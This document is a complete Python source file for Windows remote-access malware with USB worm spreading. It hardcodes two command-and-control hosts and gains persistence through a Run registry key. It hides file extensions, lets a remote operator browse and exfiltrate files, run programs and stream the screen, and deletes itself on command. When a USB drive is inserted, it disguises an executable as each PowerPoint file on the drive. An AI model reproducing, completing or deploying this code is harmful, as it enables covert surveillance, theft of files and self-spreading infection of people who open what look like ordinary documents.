# -*- coding: utf-8 -*-
import base64
import json
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
import winreg
import signal
from typing import Dict, Any, Optional
from pathlib import Path
import multiprocessing
import cv2
import numpy as np
import win32api
import win32file
from PIL import ImageGrab
import random
import string

EGG = {
    "ips": [
        {"ip": "us-sjc-bgp-1.ofalias.org", "port": 60813},
        {"ip": "kr-nc-bgp-1.ofalias.net", "port": 50738}
    ]
}


def create_task_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))


def clear_directory(directory: Path):
    for filename in os.listdir(directory):
        file_path = directory / filename
        if file_path.is_file() or file_path.is_symlink():
            file_path.unlink()
        elif file_path.is_dir():
            shutil.rmtree(file_path)


def is_usb_drive(drive_letter: str) -> bool:
    drive_type = win32file.GetDriveType(f"{drive_letter}:\\")
    if drive_type == win32file.DRIVE_REMOVABLE:
        return True
    return False


def is_current_path_on_usb_drive() -> bool:
    current_path = Path.cwd()
    drive_letter = current_path.drive[0]
    drive_type = win32file.GetDriveType(f"{drive_letter}:\\")
    if drive_type == win32file.DRIVE_REMOVABLE:
        return True
    else:
        return False


def write_registry_value(key_path: str, value_name: str, value: str, value_type):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, value_name, 0, value_type, value)
        winreg.CloseKey(key)
        print(f"Value '{value_name}' has been written to the registry.")
    except PermissionError:
        print("Permission denied. You need to run this script as administrator.")


class FileJoiner:
    def __init__(self, file1_path: Path, file2_path: Path, output_dir: Path):
        self.file1_path = file1_path
        self.file2_path = file2_path
        self.output_dir = output_dir
        self.py_file = output_dir / "py_file.pyw"
        self.py_file_spec = output_dir / "py_file.spec"

    def join_files(self):
        with open(self.file1_path, 'rb') as file1:
            file1_base64 = base64.b64encode(file1.read()).decode('utf-8')
        with open(self.file2_path, 'rb') as file2:
            file2_base64 = base64.b64encode(file2.read()).decode('utf-8')

        self._create_py_script(file1_base64, file2_base64)
        self._run_pyinstaller()

    def _create_py_script(self, file1_base64: str, file2_base64: str):
        file1_name = self.file1_path.name
        file2_name = self.file2_path.name

        script_content = f'''
# -*- coding: utf-8 -*-
import base64
import os

def join(base64_data, file_name):
    temp_path = os.path.join(os.environ["TEMP"], file_name)
    data = base64.b64decode(base64_data)
    with open(temp_path, "wb") as output_file:
        output_file.write(data)
    os.startfile(temp_path)

file1_base64 = """{file1_base64}"""
file2_base64 = """{file2_base64}"""

join(file1_base64, r"{file1_name}")
join(file2_base64, r"{file2_name}")
'''

        with open(self.py_file, 'w', encoding='utf-8') as py_file:
            py_file.write(script_content)

    def get_exe_path(self) -> Path:
        return Path(self.exe_path)

    def _run_pyinstaller(self):
        if not self.output_dir.exists():
            self.output_dir.mkdir(parents=True, exist_ok=True)
        exe_name = create_task_id()
        self.exe_path = self.output_dir / f"{exe_name}.exe"
        pyinstaller_cmd = (
            'pyinstaller'
            " --noconsole"
            " --distpath {distpath}"
            ' --workpath {workpath}'
            ' --specpath {specpath}'
            " --icon {ico}"
            " --onefile"
            " --name {name}"
            ' {script}'
        ).format(
            script=self.py_file,
            name=exe_name,
            distpath=self.output_dir,
            workpath=self.output_dir,
            specpath=self.output_dir,
            ico=Path.cwd() / "ppt.ico"
        )

        subprocess.call(pyinstaller_cmd, shell=True)

    def clean_up(self):
        clear_directory(self.output_dir)


class Client:
    def __init__(self, info: Dict):
        self.running = True
        self.receive_running = True
        self.info = info
        self.ip = info["ips"][0]["ip"]
        self.port = info["ips"][0]["port"]
        self.appdata_path = Path(os.getenv('APPDATA'))
        self.temp_path = self.appdata_path / 'crc'
        self.egg_path = self.appdata_path / 'crc_info'
        self.self_path = self.appdata_path / 'crc.exe'
        self.temp_path.mkdir(parents=True, exist_ok=True)

        self.remote_control_list = []
        self.id: Optional[str] = None
        self.heartbeat_interval = 1  # 心跳间隔（秒）
        self.allowable_intervals = 2  # 允许的最大间隔（秒）
        self.last_send_heartbeat = time.time()  # 上次发送心跳的时间
        self.server_last_heartbeat = time.time()  # 上次收到服务器心跳的时间

        self.initialize_client()
        self.setup_socket()
        self.start_threads()
        signal.signal(signal.SIGINT, self.handle_exit)
        signal.signal(signal.SIGTERM, self.handle_exit)

        self.init_heartbeat()

        while self.running:
            time.sleep(0.5)
            pass

    def handle_exit(self, signum, frame):
        self.close_socket()

    def initialize_client(self):
        self.detect_client()
        self.copy_self(self.self_path)
        self.create_running_identifier()
        self.add_to_startup()
        self.hide_file_ext()

    def init_heartbeat(self):
        self.send_heartbeat()

    def __del__(self):
        self.close_socket()
        self.close_socket()

    def start_threads(self):
        self.detect_usb_insertion_thread = threading.Thread(target=self.detect_usb_insertion, daemon=True)
        self.detect_usb_insertion_thread.start()

        self.send_heartbea_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        self.send_heartbea_thread.start()

        self.detect_server_is_onlien_thread = threading.Thread(target=self.detect_server_is_onlien, daemon=True)
        self.detect_server_is_onlien_thread.start()

    def setup_socket(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.ip, self.port))

        self.receive_thread = threading.Thread(target=self.receive_message, daemon=True)
        self.receive_thread.start()

        self.init_control()

    def send_message(self, message: Dict[str, Any]) -> None:
        self.socket.send(json.dumps(message).encode('utf-8'))

    def init_control(self) -> None:
        init_message = {"mode": "init", "client_mode": "controlled"}
        self.send_message(init_message)

    def receive_message(self) -> None:
        buffer = ""
        while self.running and self.receive_running:

            data = self.socket.recv(1048576).decode('utf-8')
            if not data:
                break
            buffer += data
            while True:
                try:
                    msg, idx = json.JSONDecoder().raw_decode(buffer)
                    self.handle_message(msg)
                    buffer = buffer[idx:].lstrip()
                except ValueError:
                    break

    def directory(self, data: Dict[str, Any]) -> None:
        root_path = Path(data["data"]["root"])
        file_list = []
        try:
            for entry in os.listdir(root_path):
                entry_path = root_path / entry
                if entry_path.is_dir():
                    file_list.append(f"{entry_path}/")
                elif entry_path.is_file():
                    file_list.append(str(entry_path))
        except Exception as e:
            file_list.append(f"Error: {str(e)}")

        response = {
            "mode": "return",
            "controll_client_id": data["data"]["controll_client_id"],
            "data": {
                "mode": "dir",
                "list": file_list,
                "client_id": self.id,
                "root": str(root_path)
            }
        }
        self.send_message(response)

    def download(self, file_path: Path, controll_client_id: str, output: str) -> None:
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(1024 * 1024 * 10)  # 10mb
                    if not chunk:
                        break
                    chunk_data = chunk.hex()
                    response = {
                        "mode": "return",
                        "controll_client_id": controll_client_id,
                        "data": {
                            "mode": "download",
                            "data": chunk_data,
                            "file": str(file_path),
                            "output": output,
                            "chunk": True
                        }
                    }
                    self.send_message(response)
            response = {
                "mode": "return",
                "controll_client_id": controll_client_id,
                "data": {
                    "mode": "download",
                    "data": "",
                    "file": str(file_path),
                    "output": output,
                    "chunk": False
                }
            }
            self.send_message(response)
            time.sleep(0.1)
        except Exception as e:
            print(f"Download error: {e}")

    def init_download(self, data):
        file_path = Path(data["data"]["file"])
        controll_client_id = data["data"]["controll_client_id"]
        output = data["data"].get("output", "")
        self.download(file_path, controll_client_id, output)

    def remote_control(self, data):
        fps = data["data"].get("fps", 25)
        definition = data["data"].get("definition", 720)
        quality = data["data"].get("quality", 70)

        resolutions = {
            360: (640, 360),
            480: (854, 480),
            720: (1280, 720),
            1080: (1920, 1080),
            "2k": (2560, 1440),
            "4k": (3840, 2160)
        }
        target_size = resolutions.get(definition, (1280, 720))

        while self.running:
            try:
                start_time = time.time()
                img = ImageGrab.grab()
                img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

                original_height, original_width = img.shape[:2]
                original_ratio = original_width / original_height
                target_ratio = 16 / 9

                if original_ratio > target_ratio:
                    new_width = original_width
                    new_height = int(new_width / target_ratio)
                    delta_height = new_height - original_height
                    top, bottom = delta_height // 2, delta_height - (delta_height // 2)
                    img = cv2.copyMakeBorder(img, top, bottom, 0, 0, cv2.BORDER_CONSTANT, value=[0, 0, 0])
                elif original_ratio < target_ratio:
                    new_height = original_height
                    new_width = int(new_height * target_ratio)
                    delta_width = new_width - original_width
                    left, right = delta_width // 2, delta_width - (delta_width // 2)
                    img = cv2.copyMakeBorder(img, 0, 0, left, right, cv2.BORDER_CONSTANT, value=[0, 0, 0])

                img = cv2.resize(img, target_size)
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
                _, buffer = cv2.imencode('.jpg', img, encode_param)
                jpg_as_text = base64.b64encode(buffer).decode('utf-8')

                response = {
                    "mode": "return",
                    "controll_client_id": data["controll_client_id"],
                    "remote_control_id": data["remote_control_id"],
                    "data": {
                        "params": data["data"],
                        "mode": "remote_control",
                        "img": jpg_as_text,
                        "timestamp": time.time(),
                        "quality": quality,
                        "resolution": f"{target_size[0]}x{target_size[1]}"
                    }
                }
                self.send_message(response)

                process_time = time.time() - start_time
                sleep_time = max(0, (1 / fps) - process_time)
                time.sleep(sleep_time)
            except Exception as e:
                print(f"Remote control error: {e}")
                break

    def init_remote_control(self, data):
        remote_control_thread = threading.Thread(target=self.remote_control, args=(data,), daemon=True)
        remote_control_thread.start()
        self.remote_control_list.append({
            "id": data["remote_control_id"],
            "thread": remote_control_thread
        })

    def get_remote_control(self, id):
        for r in self.remote_control_list:
            if r["id"] == id:
                return r
        return None

    def stop_remote_control(self, data):
        remote_control_info = self.get_remote_control(data["data"]["remote_control_id"])
        if remote_control_info:
            self.remote_control_list.remove(remote_control_info)

    def run(self, data: Dict[str, Any]) -> None:
        exe_path = data["data"]["exe_path"]

        if not os.path.exists(exe_path):
            self.send_message({
                "mode": "return",
                "controll_client_id": data["data"]["controll_client_id"],
                "data": {
                    "mode": "run",
                    "exe_path": exe_path,
                    "state": "error",
                    "client_id": self.id,
                    "error": f"File not found: {exe_path}"
                }
            })
            return

        try:
            os.startfile(exe_path)
            self.send_message({
                "mode": "return",
                "controll_client_id": data["data"]["controll_client_id"],
                "data": {
                    "mode": "run",
                    "exe_path": exe_path,
                    "state": "success",
                    "client_id": self.id,
                    "exe": exe_path,
                }
            })
        except Exception as e:
            self.send_message({
                "mode": "return",
                "controll_client_id": data["data"]["controll_client_id"],
                "data": {
                    "mode": "run",
                    "exe_path": exe_path,
                    "state": "error",
                    "client_id": self.id,
                    "error": str(e)
                }
            })

    def kill_self_process(self):
        if self.egg_path.is_file():
            os.remove(self.egg_path)
        if self.self_path.is_file():
            os.remove(self.self_path)
        self.close_socket()
        self.running = False
        sys.exit(0)

    def kill_self(self) -> None:
        if self.running:
            kill_process = multiprocessing.Process(target=self.kill_self_process, args=())
            kill_process.start()

    def reconnect_to_server(self):
        self.close_socket()
        self.receive_running = False
        i = 0
        while self.running:
            try:
                self.ip = self.info["ips"][i]["ip"]
                self.port = self.info["ips"][i]["port"]
                self.setup_socket()
                break
            except Exception:
                time.sleep(5)

    def detect_server_is_onlien(self) -> None:
        while True:
            if self.server_last_heartbeat - self.last_send_heartbeat > self.allowable_intervals:
                self.reconnect_to_server()

    def handle_message(self, data: Dict[str, Any]) -> None:
        if data["mode"] == "init":
            self.id = data["id"]
        elif data["mode"] == "back_heartbeat":
            self.server_last_heartbeat = time.time()
        elif data["mode"] == "kill_self":
            self.kill_self()
        elif data["mode"] == "directory":
            self.directory(data)
        elif data["mode"] == "run":
            self.run(data)
        elif data["mode"] == "init_download":
            self.init_download(data)
        elif data["mode"] == "init_remote_control":
            self.init_remote_control(data)
        elif data["mode"] == "stop_remote_control":
            self.stop_remote_control(data)

    def close_socket(self):
        if hasattr(self, 'socket') and self.socket:
            self.send_message({"mode": "close"})
            self.socket.close()
            self.socket = None

    def detect_client(self):
        if self.egg_path.is_file():
            self.running = False
            sys.exit(0)

    def create_running_identifier(self):
        open(self.egg_path, 'w')

    def copy_self(self, path: Path) -> None:
        current_script_path = Path(sys.argv[0]).resolve()
        path.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(current_script_path, path)

    def binding_pdf_with_exe(self, pdf_list: list) -> None:
        for pdf in pdf_list:
            ppt_path = Path(pdf)
            ppt_name = ppt_path.stem

            file_joiner = FileJoiner(Path(pdf), Path("memreduct.exe"), self.temp_path)
            file_joiner.join_files()
            exe_path = file_joiner.get_exe_path()

            new_exe_path = ppt_path.parent / f"{ppt_name}.exe"
            new_exe_path.parent.mkdir(parents=True, exist_ok=True)
            shutil.move(str(exe_path), str(new_exe_path))
            file_joiner.clean_up()

    def detect_usb_insertion(self):
        current_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
        while self.running:
            new_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
            for drive in new_drives:
                if drive not in current_drives:
                    pdf_list = self.find_pdfs(Path(drive))
                    if pdf_list:
                        self.binding_pdf_with_exe(pdf_list)
            current_drives = new_drives
            time.sleep(1)

    def find_pdfs(self, drive: Path):
        pdf_list = []
        for root, dirs, files in os.walk(drive):
            for file in files:
                if file.lower().endswith(('.ppt', '.pptx')):
                    pdf_list.append(Path(root) / file)
        return pdf_list

    def add_to_startup(self):
        with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as registry:
            with winreg.OpenKey(registry, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "rc", 0, winreg.REG_SZ, str(self.self_path))

    def hide_file_ext(self):
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
                             0,
                             winreg.KEY_WRITE)
        winreg.SetValueEx(key, "HideFileExt", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

    def send_heartbeat(self):
        while True:
            self.send_message({"mode": "heartbeat"})
            self.last_send_heartbeat = time.time()
            time.sleep(self.heartbeat_interval)

if __name__ == "__main__":
    client = Client(EGG)
